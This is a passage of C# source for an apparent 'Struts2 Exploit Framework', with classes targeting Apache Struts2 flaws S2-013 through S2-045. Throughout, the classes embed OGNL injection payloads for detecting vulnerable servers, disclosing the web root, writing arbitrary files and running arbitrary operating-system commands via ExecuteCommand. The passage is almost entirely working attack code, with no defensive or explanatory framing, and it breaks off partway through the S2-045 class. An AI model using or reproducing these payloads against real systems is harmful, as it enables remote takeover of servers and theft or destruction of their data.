using System;
using System.Text;
using System.IO;
using System.Net;

namespace Struts2_Exploit_Framework
{
    namespace Attack
    {
        class VulModel
        {
            internal static string targetUrl { get; set; }
            public static bool IsVulnerable { get; set; }

            public VulModel(string Url)
            {
                targetUrl = Url;
                IsVulnerable = false;
            }

            public static VulModel Create(string url, int vulIndex)
            {
                if (vulIndex == 0) return new S2_013(url);
                else if (vulIndex == 1) return new S2_016(url);
                else if (vulIndex == 2) return new S2_019(url);
                else if (vulIndex == 3) return new S2_032(url);
                else if (vulIndex == 4) return new S2_033(url);
                else if (vulIndex == 5) return new S2_037(url);
                else if (vulIndex == 6) return new S2_045(url);
                else if (vulIndex == 7) return new S2_046(url);
                else return null;
            }
        }

        class S2_013 : VulModel
        {
            private static string testPoc = "a=${#_memberAccess['allowStaticMethodAccess']=true,#a=@java.lang.Runtime@getRuntime().exec('echo fctf{d57162c35fe74e4c122aca2c8b9e9a25}').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#d)),#out.close()}";
            private static string webRootPoc = "a=1${(%23_memberAccess['allowStaticMethodAccess']=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.println(%23req.getRealPath('/')),%23k8out.close())}";
            private static string rceExp = "a=${#_memberAccess['allowStaticMethodAccess']=true,#a=@java.lang.Runtime@getRuntime().exec('$CMD$').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#d)),#out.close()}";
            private static string uploadExp = "a=1${(#_memberAccess['allowStaticMethodAccess']=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#fos= new java.io.FileOutputStream(#req.getParameter('f')),#fos.write(#req.getParameter('t').getBytes()),#fos.close(),#outstr.println('UploadOK'),#outstr.close())}\n\n";

            public S2_013(string Url) : base(Url)
            { }

            public bool CheckVul()
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(testPoc);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(testPoc);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("fctf{d57162c35fe74e4c122aca2c8b9e9a25}"))
                {
                    IsVulnerable = true;
                    return true;
                }
                else
                {
                    return false;
                }
            }

            public string GetWebRoot()
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(webRootPoc);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(webRootPoc);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString;
            }

            private static string BuildRCEExploit(string cmdlet)
            {
                return rceExp.Replace("$CMD$", cmdlet);
            }

            public string ExecuteCommand(string cmdlet)
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    string thisExp = BuildRCEExploit(cmdlet);
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(thisExp);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(thisExp);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString.Replace('\0', ' ').Trim();
            }

            public bool Upload(string fileContent)
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl+'?'+uploadExp);
                    req.Method = "GET";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(fileContent);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(fileContent);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("UploadOK"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        class S2_016 : VulModel
        {
            private static string testPoc = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27echo%20fctf%7Bd57162c35fe74e4c122aca2c8b9e9a25%7D%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
            private static string webRootPoc = "redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D";
            private static string rceExp = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27$CMD$%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";

            public S2_016(string Url) : base(Url)
            { }

            public bool CheckVul()
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(testPoc);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(testPoc);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("fctf{d57162c35fe74e4c122aca2c8b9e9a25}"))
                {
                    IsVulnerable = true;
                    return true;
                }
                else
                {
                    return false;
                }
            }

            public string GetWebRoot()
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(webRootPoc);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(webRootPoc);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString;
            }

            private static string BuildRCEExploit(string cmdlet)
            {
                return rceExp.Replace("$CMD$", WebUtility.UrlEncode(cmdlet));
            }

            public string ExecuteCommand(string cmdlet)
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    string thisExp = BuildRCEExploit(cmdlet);
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(thisExp);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(thisExp);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString.Replace('\0', ' ').Trim();
            }
        }

        class S2_019 : VulModel
        {
            private static string testPoc = "debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#e=new char[10000],#e='fctf{d57162c35fe74e4c122aca2c8b9e9a25}',#resp.println(#e),#resp.close()";
            private static string webRootPoc = "debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath('/'),#matt=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C#matt.getWriter().println(#c),#matt.getWriter().flush(),#matt.getWriter().close()";
            private static string rceExp = "debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{$CMD$})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()";

            public S2_019(string Url) : base(Url)
            { }

            private static string CmdParser(string cmd)
            {
                string retString = "";
                string[] p = cmd.Split(' ');
                retString = string.Join("','", p);
                retString = "'" + retString + "'";
                return retString;
            }

            public bool CheckVul()
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(testPoc);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(testPoc);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("fctf{d57162c35fe74e4c122aca2c8b9e9a25}"))
                {
                    IsVulnerable = true;
                    return true;
                }
                else
                {
                    return false;
                }
            }

            public string GetWebRoot()
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(webRootPoc);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(webRootPoc);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString;
            }

            private static string BuildRCEExploit(string cmdlet)
            {
                return rceExp.Replace("$CMD$", CmdParser(cmdlet));
            }

            public string ExecuteCommand(string cmdlet)
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    string thisExp = BuildRCEExploit(cmdlet);
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(targetUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = Encoding.ASCII.GetByteCount(thisExp);
                    // Create a POSTData Stream and Write POST Data into it
                    Stream reqStream = req.GetRequestStream();
                    StreamWriter reqStreamWriter = new StreamWriter(reqStream);
                    reqStreamWriter.Write(thisExp);
                    reqStreamWriter.Close();

                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    Stream respStream = resp.GetResponseStream();
                    StreamReader respStreamReader = new StreamReader(respStream);
                    retString = respStreamReader.ReadToEnd().Trim();
                    respStreamReader.Close();
                    respStream.Close();
                    req.Abort();
                    resp.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString.Replace('\0', ' ').Trim();
            }
        }

        class S2_032 : VulModel
        {
            private static string testPoc = "test=fctf{d57162c35fe74e4c122aca2c8b9e9a25}&method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23str%3d%23parameters.test,%23res%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23res.print(%23str[0]),%23res.flush(),%23res.close";
            private static string webRootPoc = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8";
            private static string rceExp = "method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&command=$CMD$";

            public S2_032(string Url) : base(Url)
            { }

            public bool CheckVul()
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + "?" + testPoc);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("fctf{d57162c35fe74e4c122aca2c8b9e9a25}"))
                {
                    IsVulnerable = true;
                    return true;
                }
                else
                {
                    return false;
                }
            }

            public string GetWebRoot()
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + "?" + webRootPoc);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString;
            }

            private static string BuildRCEExploit(string cmdlet)
            {
                return rceExp.Replace("$CMD$", WebUtility.UrlEncode(cmdlet));
            }

            public string ExecuteCommand(string cmdlet)
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    string thisExp = BuildRCEExploit(cmdlet);
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + "?" + thisExp);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString.Replace('\0', ' ').Trim();
            }
        }

        class S2_033 : VulModel
        {
            private static string testPoc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=fctf{d57162c35fe74e4c122aca2c8b9e9a25}";
            private static string webRootPoc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f";
            private static string rceExp = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=$CMD$";

            public S2_033(string Url) : base(Url)
            { }

            public bool CheckVul()
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + testPoc);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("fctf{d57162c35fe74e4c122aca2c8b9e9a25}"))
                {
                    IsVulnerable = true;
                    return true;
                }
                else
                {
                    return false;
                }
            }

            public string GetWebRoot()
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + webRootPoc);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString;
            }

            private static string BuildRCEExploit(string cmdlet)
            {
                return rceExp.Replace("$CMD$", WebUtility.UrlEncode(cmdlet));
            }

            public string ExecuteCommand(string cmdlet)
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    string thisExp = BuildRCEExploit(cmdlet);
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + thisExp);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString.Replace('\0', ' ').Trim();
            }
        }

        class S2_037 : VulModel
        {
            private static string testPoc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=fctf{d57162c35fe74e4c122aca2c8b9e9a25}";
            private static string webRootPoc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f";
            private static string rceExp = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=$CMD$";

            public S2_037(string Url) : base(Url)
            { }

            public bool CheckVul()
            {
                if (IsVulnerable) return IsVulnerable;
                string retString = "";
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + testPoc);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                if (retString.Contains("fctf{d57162c35fe74e4c122aca2c8b9e9a25}"))
                {
                    IsVulnerable = true;
                    return true;
                }
                else
                {
                    return false;
                }
            }

            public string GetWebRoot()
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + webRootPoc);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString;
            }

            private static string BuildRCEExploit(string cmdlet)
            {
                return rceExp.Replace("$CMD$", WebUtility.UrlEncode(cmdlet));
            }

            public string ExecuteCommand(string cmdlet)
            {
                if (!IsVulnerable) return "Not Vulnerable";
                string retString = "";
                try
                {
                    string thisExp = BuildRCEExploit(cmdlet);
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetUrl + thisExp);
                    request.Method = "GET";
                    request.ContentType = "text/html;charset=UTF-8";

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();
                    request.Abort();
                    response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return retString.Replace('\0', ' ').Trim();
            }
        }

        class S2_045 : VulModel
        {
            private static string testPoc = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo fctf{d57162c35fe74e4c122aca2c8b9e9a25}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
            private static string webRootPoc = "%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath('/'))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
